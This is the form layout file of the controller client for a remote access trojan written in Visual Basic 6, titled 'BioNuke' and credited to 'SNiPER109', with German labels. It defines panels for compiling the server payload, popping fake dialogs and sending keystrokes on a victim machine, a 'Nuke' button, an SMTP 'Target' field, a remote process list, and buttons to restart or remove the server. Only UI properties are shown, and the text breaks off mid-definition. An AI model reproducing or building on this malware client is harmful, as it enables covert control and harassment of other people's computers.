VERSION 5.00
Object = "{831FDD16-0C5C-11D2-A9FC-0000F8754DA1}#2.0#0"; "MSCOMCTL.OCX"
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "COMDLG32.OCX"
Object = "{B0DC20EB-FBE7-46C9-9123-EE523C29B7E4}#1.0#0"; "DMSlider Control.ocx"
Begin VB.Form frmMain 
   BorderStyle     =   3  'Fester Dialog
   Caption         =   "BioNuke - Coded by SNiPER109 - NeXt GenEratioN RaT"
   ClientHeight    =   7470
   ClientLeft      =   45
   ClientTop       =   435
   ClientWidth     =   10830
   Icon            =   "frmMain.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   7470
   ScaleWidth      =   10830
   StartUpPosition =   2  'Bildschirmmitte
   Begin VB.Frame Frame 
      BorderStyle     =   0  'Kein
      Caption         =   "BioNuke - New Dimension RAT - Coded by SNiPER109"
      Height          =   7095
      Index           =   3
      Left            =   3600
      TabIndex        =   6
      Top             =   0
      Width           =   7215
      Begin VB.TextBox Text 
         Height          =   6165
         Index           =   6
         Left            =   240
         MultiLine       =   -1  'True
         TabIndex        =   8
         Text            =   "frmMain.frx":000C
         Top             =   240
         Width           =   6735
      End
      Begin CLIENT.ChameleonButton Button 
         Height          =   375
         Index           =   1
         Left            =   5400
         TabIndex        =   7
         Top             =   6480
         Width           =   1695
         _ExtentX        =   2990
         _ExtentY        =   661
         BTYPE           =   3
         TX              =   "Compile"
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   1
         FOCUSR          =   -1  'True
         BCOL            =   14215660
         BCOLO           =   14215660
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   1
         MICON           =   "frmMain.frx":015F
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   0   'False
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
   End
   Begin MSComctlLib.ImageList ImageList1 
      Left            =   2640
      Top             =   4080
      _ExtentX        =   1005
      _ExtentY        =   1005
      BackColor       =   -2147483643
      ImageWidth      =   16
      ImageHeight     =   16
      MaskColor       =   12632256
      _Version        =   393216
      BeginProperty Images {2C247F25-8591-11D1-B16A-00C0F0283628} 
         NumListImages   =   13
         BeginProperty ListImage1 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmMain.frx":017B
            Key             =   ""
         EndProperty
         BeginProperty ListImage2 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmMain.frx":0514
            Key             =   ""
         EndProperty
         BeginProperty ListImage3 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmMain.frx":0779
            Key             =   ""
         EndProperty
         BeginProperty ListImage4 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmMain.frx":0BA1
            Key             =   ""
         EndProperty
         BeginProperty ListImage5 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmMain.frx":0F3D
            Key             =   ""
         EndProperty
         BeginProperty ListImage6 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmMain.frx":1153
            Key             =   ""
         EndProperty
         BeginProperty ListImage7 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmMain.frx":148D
            Key             =   ""
         EndProperty
         BeginProperty ListImage8 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmMain.frx":188E
            Key             =   ""
         EndProperty
         BeginProperty ListImage9 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmMain.frx":1C30
            Key             =   ""
         EndProperty
         BeginProperty ListImage10 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmMain.frx":1FBE
            Key             =   ""
         EndProperty
         BeginProperty ListImage11 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmMain.frx":20E4
            Key             =   ""
         EndProperty
         BeginProperty ListImage12 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmMain.frx":2423
            Key             =   ""
         EndProperty
         BeginProperty ListImage13 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmMain.frx":2737
            Key             =   ""
         EndProperty
      EndProperty
   End
   Begin MSWinsockLib.Winsock wsk 
      Index           =   0
      Left            =   480
      Top             =   3720
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSComctlLib.StatusBar StatusBar1 
      Align           =   2  'Unten ausrichten
      Height          =   375
      Left            =   0
      TabIndex        =   1
      Top             =   7095
      Width           =   10830
      _ExtentX        =   19103
      _ExtentY        =   661
      _Version        =   393216
      BeginProperty Panels {8E3867A5-8586-11D1-B16A-00C0F0283628} 
         NumPanels       =   4
         BeginProperty Panel1 {8E3867AB-8586-11D1-B16A-00C0F0283628} 
            Alignment       =   1
            Text            =   "- Idle -"
            TextSave        =   "- Idle -"
         EndProperty
         BeginProperty Panel2 {8E3867AB-8586-11D1-B16A-00C0F0283628} 
            AutoSize        =   1
            Object.Width           =   8176
            Text            =   "Bereit..."
            TextSave        =   "Bereit..."
         EndProperty
         BeginProperty Panel3 {8E3867AB-8586-11D1-B16A-00C0F0283628} 
            Alignment       =   1
            Object.Width           =   4833
            MinWidth        =   4833
            Text            =   "Testsserver (255.255.255.255)"
            TextSave        =   "Testsserver (255.255.255.255)"
         EndProperty
         BeginProperty Panel4 {8E3867AB-8586-11D1-B16A-00C0F0283628} 
            Alignment       =   1
            Object.Width           =   3422
            MinWidth        =   3422
            Text            =   "Disconnected"
            TextSave        =   "Disconnected"
         EndProperty
      EndProperty
   End
   Begin VB.Frame Frame 
      BorderStyle     =   0  'Kein
      Caption         =   "Frame1"
      Height          =   7095
      Index           =   8
      Left            =   3600
      TabIndex        =   46
      Top             =   0
      Width           =   7215
      Begin VB.ComboBox Combo 
         Height          =   315
         Index           =   3
         Left            =   1200
         Style           =   2  'Dropdown-Liste
         TabIndex        =   56
         Top             =   2400
         Width           =   5415
      End
      Begin VB.ComboBox Combo 
         Height          =   315
         Index           =   2
         Left            =   1200
         Style           =   2  'Dropdown-Liste
         TabIndex        =   54
         Top             =   1920
         Width           =   5415
      End
      Begin VB.TextBox Text 
         Height          =   285
         Index           =   19
         Left            =   1200
         ScrollBars      =   2  'Vertikal
         TabIndex        =   48
         Text            =   "BioNuke"
         Top             =   960
         Width           =   5415
      End
      Begin VB.TextBox Text 
         Height          =   285
         Index           =   18
         Left            =   1200
         ScrollBars      =   2  'Vertikal
         TabIndex        =   47
         Text            =   "Verstehen Sie Spaß...?"
         Top             =   1440
         Width           =   5415
      End
      Begin CLIENT.ChameleonButton Button 
         Height          =   375
         Index           =   12
         Left            =   5280
         TabIndex        =   49
         Top             =   3600
         Width           =   1335
         _ExtentX        =   2355
         _ExtentY        =   661
         BTYPE           =   3
         TX              =   "Senden"
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   1
         FOCUSR          =   -1  'True
         BCOL            =   14215660
         BCOLO           =   14215660
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   1
         MICON           =   "frmMain.frx":2950
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   0   'False
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin CLIENT.ChameleonButton Button 
         Height          =   375
         Index           =   13
         Left            =   360
         TabIndex        =   50
         Top             =   3600
         Width           =   1335
         _ExtentX        =   2355
         _ExtentY        =   661
         BTYPE           =   3
         TX              =   "Testen"
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   1
         FOCUSR          =   -1  'True
         BCOL            =   14215660
         BCOLO           =   14215660
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   1
         MICON           =   "frmMain.frx":296C
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   0   'False
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin VB.Label Label 
         BackStyle       =   0  'Transparent
         Caption         =   "Icon:"
         Height          =   255
         Index           =   23
         Left            =   360
         TabIndex        =   55
         Top             =   2400
         Width           =   4695
      End
      Begin VB.Label Label 
         BackStyle       =   0  'Transparent
         Caption         =   "Buttons:"
         Height          =   255
         Index           =   22
         Left            =   360
         TabIndex        =   53
         Top             =   1920
         Width           =   4695
      End
      Begin VB.Label Label 
         BackStyle       =   0  'Transparent
         Caption         =   "Titel:"
         Height          =   255
         Index           =   25
         Left            =   360
         TabIndex        =   52
         Top             =   960
         Width           =   4695
      End
      Begin VB.Label Label 
         BackStyle       =   0  'Transparent
         Caption         =   "Text:"
         Height          =   255
         Index           =   24
         Left            =   360
         TabIndex        =   51
         Top             =   1440
         Width           =   4695
      End
   End
   Begin VB.Frame Frame 
      BorderStyle     =   0  'Kein
      Caption         =   "Frame1"
      Height          =   7095
      Index           =   7
      Left            =   3720
      TabIndex        =   29
      Top             =   0
      Width           =   7215
      Begin VB.TextBox Text 
         Height          =   285
         Index           =   14
         Left            =   1200
         ScrollBars      =   2  'Vertikal
         TabIndex        =   38
         Top             =   3960
         Width           =   5415
      End
      Begin VB.TextBox Text 
         Height          =   285
         Index           =   13
         Left            =   1200
         ScrollBars      =   2  'Vertikal
         TabIndex        =   36
         Text            =   "[A]bort, [R]etry, [P]anic"
         Top             =   1920
         Width           =   5415
      End
      Begin VB.TextBox Text 
         Height          =   285
         Index           =   12
         Left            =   1200
         ScrollBars      =   2  'Vertikal
         TabIndex        =   34
         Text            =   "Verstehen Sie Spaß...?"
         Top             =   1440
         Width           =   5415
      End
      Begin VB.TextBox Text 
         Height          =   285
         Index           =   11
         Left            =   1200
         ScrollBars      =   2  'Vertikal
         TabIndex        =   30
         Text            =   "BioNuke"
         Top             =   960
         Width           =   5415
      End
      Begin CLIENT.ChameleonButton Button 
         Height          =   375
         Index           =   8
         Left            =   5280
         TabIndex        =   31
         Top             =   3000
         Width           =   1335
         _ExtentX        =   2355
         _ExtentY        =   661
         BTYPE           =   3
         TX              =   "Senden"
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   1
         FOCUSR          =   -1  'True
         BCOL            =   14215660
         BCOLO           =   14215660
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   1
         MICON           =   "frmMain.frx":2988
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   0   'False
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin CLIENT.ChameleonButton Button 
         Height          =   375
         Index           =   9
         Left            =   360
         TabIndex        =   32
         Top             =   3000
         Width           =   1335
         _ExtentX        =   2355
         _ExtentY        =   661
         BTYPE           =   3
         TX              =   "Testen"
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   1
         FOCUSR          =   -1  'True
         BCOL            =   14215660
         BCOLO           =   14215660
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   1
         MICON           =   "frmMain.frx":29A4
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   0   'False
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin VB.Label Label 
         BackStyle       =   0  'Transparent
         Caption         =   "Antwort:"
         Height          =   255
         Index           =   21
         Left            =   360
         TabIndex        =   39
         Top             =   3960
         Width           =   4695
      End
      Begin VB.Label Label 
         BackStyle       =   0  'Transparent
         Caption         =   "Vorgabe:"
         Height          =   255
         Index           =   20
         Left            =   360
         TabIndex        =   37
         Top             =   1920
         Width           =   4695
      End
      Begin VB.Label Label 
         BackStyle       =   0  'Transparent
         Caption         =   "Text:"
         Height          =   255
         Index           =   19
         Left            =   360
         TabIndex        =   35
         Top             =   1440
         Width           =   4695
      End
      Begin VB.Label Label 
         BackStyle       =   0  'Transparent
         Caption         =   "Titel:"
         Height          =   255
         Index           =   18
         Left            =   360
         TabIndex        =   33
         Top             =   960
         Width           =   4695
      End
   End
   Begin VB.Frame Frame 
      BorderStyle     =   0  'Kein
      Caption         =   "Frame1"
      Height          =   7095
      Index           =   6
      Left            =   3600
      TabIndex        =   24
      Top             =   0
      Width           =   7215
      Begin VB.TextBox Text 
         Height          =   975
         Index           =   10
         Left            =   480
         MultiLine       =   -1  'True
         ScrollBars      =   2  'Vertikal
         TabIndex        =   27
         Text            =   "frmMain.frx":29C0
         Top             =   1800
         Width           =   6255
      End
      Begin CLIENT.ChameleonButton Button 
         Height          =   375
         Index           =   6
         Left            =   5400
         TabIndex        =   25
         Top             =   3000
         Width           =   1335
         _ExtentX        =   2355
         _ExtentY        =   661
         BTYPE           =   3
         TX              =   "Senden"
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   1
         FOCUSR          =   -1  'True
         BCOL            =   14215660
         BCOLO           =   14215660
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   1
         MICON           =   "frmMain.frx":29D1
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   0   'False
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin CLIENT.ChameleonButton Button 
         Height          =   375
         Index           =   7
         Left            =   480
         TabIndex        =   28
         Top             =   3000
         Width           =   1335
         _ExtentX        =   2355
         _ExtentY        =   661
         BTYPE           =   3
         TX              =   "Variablen"
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   1
         FOCUSR          =   -1  'True
         BCOL            =   14215660
         BCOLO           =   14215660
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   1
         MICON           =   "frmMain.frx":29ED
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   0   'False
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin VB.Label Label 
         BackStyle       =   0  'Transparent
         Caption         =   "Gewünschte Tastenfolge:"
         Height          =   255
         Index           =   17
         Left            =   480
         TabIndex        =   26
         Top             =   1440
         Width           =   4695
      End
   End
   Begin VB.Frame Frame 
      BorderStyle     =   0  'Kein
      Caption         =   "Frame1"
      Height          =   7095
      Index           =   43
      Left            =   3600
      TabIndex        =   158
      Top             =   0
      Width           =   7215
      Begin CLIENT.ChameleonButton Button 
         Height          =   495
         Index           =   52
         Left            =   2760
         TabIndex        =   159
         Top             =   1200
         Width           =   2055
         _ExtentX        =   3625
         _ExtentY        =   873
         BTYPE           =   3
         TX              =   "Nuke"
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   1
         FOCUSR          =   -1  'True
         BCOL            =   14215660
         BCOLO           =   14215660
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   1
         MICON           =   "frmMain.frx":2A09
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   0   'False
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin VB.Label Label 
         Caption         =   $"frmMain.frx":2A25
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   2835
         Index           =   43
         Left            =   720
         TabIndex        =   160
         Top             =   2400
         Width           =   5730
      End
   End
   Begin VB.Frame Frame 
      BorderStyle     =   0  'Kein
      Caption         =   "Frame1"
      Height          =   7095
      Index           =   25
      Left            =   3600
      TabIndex        =   151
      Top             =   0
      Width           =   7215
      Begin VB.TextBox Text 
         Height          =   285
         Index           =   35
         Left            =   120
         MultiLine       =   -1  'True
         TabIndex        =   157
         Text            =   "frmMain.frx":2AB1
         Top             =   6600
         Width           =   6975
      End
      Begin VB.TextBox Text 
         Height          =   5205
         Index           =   34
         Left            =   120
         Locked          =   -1  'True
         MultiLine       =   -1  'True
         ScrollBars      =   2  'Vertikal
         TabIndex        =   156
         Top             =   1200
         Width           =   6975
      End
      Begin VB.TextBox Text 
         Height          =   285
         Index           =   33
         Left            =   840
         TabIndex        =   154
         Text            =   "mail.gmx.net:25"
         Top             =   360
         Width           =   6255
      End
      Begin CLIENT.ChameleonButton Button 
         Height          =   375
         Index           =   50
         Left            =   2880
         TabIndex        =   152
         Top             =   720
         Width           =   2055
         _ExtentX        =   3625
         _ExtentY        =   661
         BTYPE           =   3
         TX              =   "Verbindung herstellen"
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   1
         FOCUSR          =   -1  'True
         BCOL            =   14215660
         BCOLO           =   14215660
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   1
         MICON           =   "frmMain.frx":2AB9
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   0   'False
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin CLIENT.ChameleonButton Button 
         Height          =   375
         Index           =   51
         Left            =   5040
         TabIndex        =   155
         Top             =   720
         Width           =   2055
         _ExtentX        =   3625
         _ExtentY        =   661
         BTYPE           =   3
         TX              =   "Verbindung trennen"
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   1
         FOCUSR          =   -1  'True
         BCOL            =   14215660
         BCOLO           =   14215660
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   1
         MICON           =   "frmMain.frx":2AD5
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   0   'False
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin VB.Label Label 
         Caption         =   "Target:"
         Height          =   255
         Index           =   42
         Left            =   120
         TabIndex        =   153
         Top             =   360
         Width           =   975
      End
   End
   Begin VB.Frame Frame 
      BorderStyle     =   0  'Kein
      Caption         =   "Frame1"
      Height          =   7095
      Index           =   30
      Left            =   3600
      TabIndex        =   147
      Top             =   0
      Width           =   7215
      Begin CLIENT.ChameleonButton Button 
         Height          =   495
         Index           =   47
         Left            =   360
         TabIndex        =   148
         Top             =   1560
         Width           =   6375
         _ExtentX        =   11245
         _ExtentY        =   873
         BTYPE           =   3
         TX              =   "Server schließen"
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   1
         FOCUSR          =   -1  'True
         BCOL            =   14215660
         BCOLO           =   14215660
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   1
         MICON           =   "frmMain.frx":2AF1
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   0   'False
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin CLIENT.ChameleonButton Button 
         Height          =   495
         Index           =   48
         Left            =   360
         TabIndex        =   149
         Top             =   2400
         Width           =   6375
         _ExtentX        =   11245
         _ExtentY        =   873
         BTYPE           =   3
         TX              =   "Server neustarten"
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   1
         FOCUSR          =   -1  'True
         BCOL            =   14215660
         BCOLO           =   14215660
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   1
         MICON           =   "frmMain.frx":2B0D
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   0   'False
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin CLIENT.ChameleonButton Button 
         Height          =   495
         Index           =   49
         Left            =   360
         TabIndex        =   150
         Top             =   3240
         Width           =   6375
         _ExtentX        =   11245
         _ExtentY        =   873
         BTYPE           =   3
         TX              =   "Server entfernen"
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   1
         FOCUSR          =   -1  'True
         BCOL            =   14215660
         BCOLO           =   14215660
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   1
         MICON           =   "frmMain.frx":2B29
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   0   'False
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
   End
   Begin VB.Frame Frame 
      BorderStyle     =   0  'Kein
      Caption         =   "Frame1"
      Height          =   7095
      Index           =   29
      Left            =   3600
      TabIndex        =   144
      Top             =   0
      Width           =   7215
      Begin VB.TextBox Text 
         Height          =   6015
         Index           =   31
         Left            =   240
         Locked          =   -1  'True
         MultiLine       =   -1  'True
         ScrollBars      =   2  'Vertikal
         TabIndex        =   146
         Top             =   240
         Width           =   6735
      End
      Begin CLIENT.ChameleonButton Button 
         Height          =   375
         Index           =   46
         Left            =   4920
         TabIndex        =   145
         Top             =   6360
         Width           =   2055
         _ExtentX        =   3625
         _ExtentY        =   661
         BTYPE           =   3
         TX              =   "Abrufen"
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   1
         FOCUSR          =   -1  'True
         BCOL            =   14215660
         BCOLO           =   14215660
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   1
         MICON           =   "frmMain.frx":2B45
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   0   'False
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
   End
   Begin VB.Frame Frame 
      BorderStyle     =   0  'Kein
      Caption         =   "Frame1"
      Height          =   7095
      Index           =   22
      Left            =   3600
      TabIndex        =   139
      Top             =   0
      Width           =   7215
      Begin MSComctlLib.ImageList ImageList3 
         Left            =   6480
         Top             =   4800
         _ExtentX        =   1005
         _ExtentY        =   1005
         BackColor       =   -2147483643
         ImageWidth      =   16
         ImageHeight     =   16
         MaskColor       =   12632256
         _Version        =   393216
         BeginProperty Images {2C247F25-8591-11D1-B16A-00C0F0283628} 
            NumListImages   =   13
            BeginProperty ListImage1 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frmMain.frx":2B61
               Key             =   ""
            EndProperty
            BeginProperty ListImage2 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frmMain.frx":2D91
               Key             =   ""
            EndProperty
            BeginProperty ListImage3 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frmMain.frx":30CB
               Key             =   ""
            EndProperty
            BeginProperty ListImage4 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frmMain.frx":32D9
               Key             =   ""
            EndProperty
            BeginProperty ListImage5 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frmMain.frx":35FD
               Key             =   ""
            EndProperty
            BeginProperty ListImage6 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frmMain.frx":394D
               Key             =   ""
            EndProperty
            BeginProperty ListImage7 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frmMain.frx":3D3F
               Key             =   ""
            EndProperty
            BeginProperty ListImage8 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frmMain.frx":40F1
               Key             =   ""
            EndProperty
            BeginProperty ListImage9 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frmMain.frx":4554
               Key             =   ""
            EndProperty
            BeginProperty ListImage10 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frmMain.frx":4967
               Key             =   ""
            EndProperty
            BeginProperty ListImage11 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frmMain.frx":4B8C
               Key             =   ""
            EndProperty
            BeginProperty ListImage12 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frmMain.frx":4DA5
               Key             =   ""
            EndProperty
            BeginProperty ListImage13 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frmMain.frx":4FCD
               Key             =   ""
            EndProperty
         EndProperty
      End
      Begin MSComctlLib.ListView ListProcess 
         Height          =   5775
         Left            =   120
         TabIndex        =   140
         Top             =   120
         Width           =   6975
         _ExtentX        =   12303
         _ExtentY        =   10186
         View            =   3
         LabelEdit       =   1
         LabelWrap       =   -1  'True
         HideSelection   =   -1  'True
         FullRowSelect   =   -1  'True
         _Version        =   393217
         SmallIcons      =   "ImageList3"
         ForeColor       =   -2147483640
         BackColor       =   -2147483643
         BorderStyle     =   1
         Appearance      =   1
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Verdana"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         NumItems        =   3
         BeginProperty ColumnHeader(1) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
            Text            =   "Name"
            Object.Width           =   6350
         EndProperty
         BeginProperty ColumnHeader(2) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
            SubItemIndex    =   1
            Text            =   "Priorität"
            Object.Width           =   2540
         EndProperty
         BeginProperty ColumnHeader(3) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
            SubItemIndex    =   2
            Text            =   "ProzessID"
            Object.Width           =   2717
         EndProperty
      End
      Begin CLIENT.ChameleonButton Button 
         Height          =   375
         Index           =   57
         Left            =   120
         TabIndex        =   141
         Top             =   6360
         Width           =   2055
         _ExtentX        =   3625
         _ExtentY        =   661
         BTYPE           =   3
         TX              =   "Auflisten"
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   1
         FOCUSR          =   -1  'True
         BCOL            =   14215660
         BCOLO           =   14215660
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   1
         MICON           =   "frmMain.frx":53B2
         UMCOL           =   -1  'True
